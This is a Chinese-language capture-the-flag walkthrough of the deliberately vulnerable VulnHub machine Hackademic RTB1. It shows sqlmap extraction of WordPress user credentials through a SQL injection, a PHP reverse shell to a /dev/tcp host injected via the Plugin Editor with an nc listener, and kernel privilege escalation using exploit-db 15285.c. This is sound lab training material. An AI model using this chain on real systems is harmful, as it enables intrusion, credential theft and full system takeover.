> 系列：[Hackademic](https://www.vulnhub.com/series/hackademic,4/)（此系列共2台）
>  难度：初级

### 信息收集

**主机发现**

```bash
netdiscover -r 192.168.80.0/24
```



![image-20230819150242058](./imgs/image-20230819150242058.png)

**端口扫描**

```bash
nmap -A -p- 192.168.80.143
```

![image-20230819151707785](./imgs/image-20230819151707785.png)



访问80端口

![image-20230819151453856](./imgs/image-20230819151453856.png)

使用指纹识别插件查看是`WordPress`

![image-20230819151946799](./imgs/image-20230819151946799.png)

根据首页显示的内容，点击`target`

![image-20230819152040904](./imgs/image-20230819152040904.png)

![image-20230819152140328](./imgs/image-20230819152140328.png)

点击 页面能点击的链接，发现点击`Uncategorized`的时候，链接变成了

```
http://192.168.80.143/Hackademic_RTB1/?cat=1
```



![image-20230819152319809](./imgs/image-20230819152319809.png)

尝试有无SQL注入，在`?cat=1`后加上`'`，发现有SQL语句的报错信息，可以判断有SQL注入漏洞

![image-20230819152424365](./imgs/image-20230819152424365.png)

**目录扫描**

单纯的爆破IP地址，扫描不出有用的目录信息

```bash
dirsearch -u http://192.168.80.143 -i 200   
```

![image-20230819164419748](./imgs/image-20230819164419748.png)

开始是直接扫了IP，现在多了一个目录/Hackademic_RTB1/，那么直接扫该目录

```bash
dirsearch -u http://192.168.80.143/Hackademic_RTB1/ -i 200
```



![image-20230819164354082](./imgs/image-20230819164354082.png)



### 漏洞利用

**sqlmap**

查看都有哪些数据库

```bash
sqlmap -u "192.168.80.143/Hackademic_RTB1/?cat=1" --dbs --batch 
```

![image-20230819152623542](./imgs/image-20230819152623542.png)

获取所有表

```bash
sqlmap -u "192.168.80.143/Hackademic_RTB1/?cat=1" -D wordpress --tables --batch
```

![image-20230819152737643](./imgs/image-20230819152737643.png)

获取该表的所有字段

```bash
sqlmap -u "192.168.80.143/Hackademic_RTB1/?cat=1" -D wordpress -T wp_users  --columns --batch 
```



![image-20230819152939501](./imgs/image-20230819152939501.png)

获取想要的数据

```bash
sqlmap -u "192.168.80.143/Hackademic_RTB1/?cat=1" -D wordpress -T wp_users  -C user_login,user_pass --dump
```

![image-20230819153048717](./imgs/image-20230819153048717.png)

登录后台`192.168.80.143/Hackademic_RTB1/wp-admin/`

![image-20230819164537854](./imgs/image-20230819164537854.png)

使用一个用户密码登录     `NickJames`密码：`admin`

![image-20230819165028767](./imgs/image-20230819165028767.png)

登上 之后没有什么能够 利用的，尝试换一个用户登录看看

用户:`GeorgeMiller`密码`q1w2e3`，发现在`Plugins`选项里有一个`Plugin Editor`编辑的地址，加入反弹shell

```php
system("bash -c 'sh -i &>/dev/tcp/192.168.80.132/8989 0>&1'");
```

![image-20230819184510299](./imgs/image-20230819184510299.png)

kali开启监听

```bash
nc -lvvp 8989
```

提交之后就得要知道上文的 路径，找出路径才能==触发==反弹shell

---

==**找到提交路径方式一：**==

---

> wordpress上传的文件默认是存储在目录`/wp-content/uploads`中，Uploads文件夹中包括所有你上传的图片，视频和附件。
>
> WordPress文件夹内，你会发现大量的代码文件和3个文件夹**==wp-admin wp-content wp-includes==**
>
> `wp-admin `没错，这是你的仪表板你登陆wordpress后看到的界面，包括所有的后台文件
>
> `wp-content`包含你所有的内容，包括插件 ， 主题和您上传的内容
>
> Plugins文件夹包含所有插件。 每个插件都有一个自己的文件夹。 如Aksimet坐在Akismet在文件夹内
>
> 同样，theme主题文件夹保存你所有的主题。 插件一样，每个主题有单独的文件夹。
>
> Uploads文件夹，所有你上传图片，视频和附件。
>
> languages是关于语言的
>
> `wp-includes`包括持有的所有文件和库，是必要的WordPress管理，编辑和JavaScript库，CSS和图像fiels

在爆破目录的时候发现有一个`wp-content`目录，可以访问一下看看

![image-20230819171036292](./imgs/image-20230819171036292.png)

页面显示如下

`http://192.168.80.143/Hackademic_RTB1/wp-content/`

![image-20230819171102568](./imgs/image-20230819171102568.png)

刚在又是在`Plugins`选项里的`Plugin Editor`编辑的反弹shell，刚在`Plugin Editor`编辑页面也显示了说正在编辑`hello.php`

![image-20230819184413751](./imgs/image-20230819184413751.png)

所以在`http://192.168.80.143/Hackademic_RTB1/wp-content/`页面中点击`plugins`

![image-20230819171841864](./imgs/image-20230819171841864.png)

![image-20230819171903184](./imgs/image-20230819171903184.png)

就看到了`hello.php`，点击`hello.php`触发反弹shell      （耐心等待-----------------）



![image-20230819172020273](./imgs/image-20230819172020273.png)

### 内核提权

查看内核版本

```bash
uname -a
```

![image-20230819180019128](./imgs/image-20230819180019128.png)

新开一个终端搜索该版本的漏洞

```bash
searchsploit 2.6.3 | grep "Local Privilege Escalation"
```

![image-20230819180245056](./imgs/image-20230819180245056.png)

查看完整路径

```bash
searchsploit -p linux/local/15285.c 
```

![image-20230819180544957](./imgs/image-20230819180544957.png)

把这个`15285.c`复制到`apache`服务的根路径`/var/www/html`下

```bash
sudo cp  /usr/share/exploitdb/exploits/linux/local/15285.c  /var/www/html/15285.c
```

启动`apache`服务

```bash
systemctl restart apache2.service
```

![image-20230819184303398](./imgs/image-20230819184303398.png)

```bash
gcc 15285.c -o exp

# 将15285.c预处理、汇编、编译并链接形成可执行文件exp

#-o选项用来指定输出文件的文件名
```

==**将`15285.c`预处理、汇编、编译并链接形成可执行文件`exp`。**==

==**`-o`选项用来指定输出文件的文件名**==

---

![image-20230819185040509](./imgs/image-20230819185040509.png)

![image-20230819184923101](./imgs/image-20230819184923101.png)

闯关成功！！！

